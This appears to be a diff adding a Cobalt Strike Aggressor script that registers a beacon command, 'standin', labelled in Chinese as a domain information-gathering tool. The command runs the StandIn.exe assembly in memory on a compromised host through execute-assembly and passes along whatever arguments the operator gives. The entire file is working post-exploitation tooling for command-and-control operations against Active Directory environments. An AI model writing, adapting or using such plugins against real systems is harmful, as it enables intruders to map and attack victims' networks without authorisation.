@@ -1,0 +1,19 @@
+beacon_command_register("standin", "域内信息收集工具",
+	"Usage: standin [arguments]\n\n" .
+	"Uses execute-assembly to run the assembly and takes given arguments\n");
+    
+alias standin{
+	local('$bid $asm $desc @args $argu');
+	$bid = $1;
+	$desc = "standin";
+	@args = @_;
+	remove(@args, $bid);
+	$argu = join(' ', @args);
+	if ($argu eq ""){
+		blog2($bid, "" . dstamp(ticks()) . " Executing $desc");
+	}
+	else{
+		blog2($bid, "" . dstamp(ticks()) . " Executing $desc \'$argu\'");
+	}
+	bexecute_assembly!($bid, script_resource("exe/StandIn.exe"), $argu);
+}
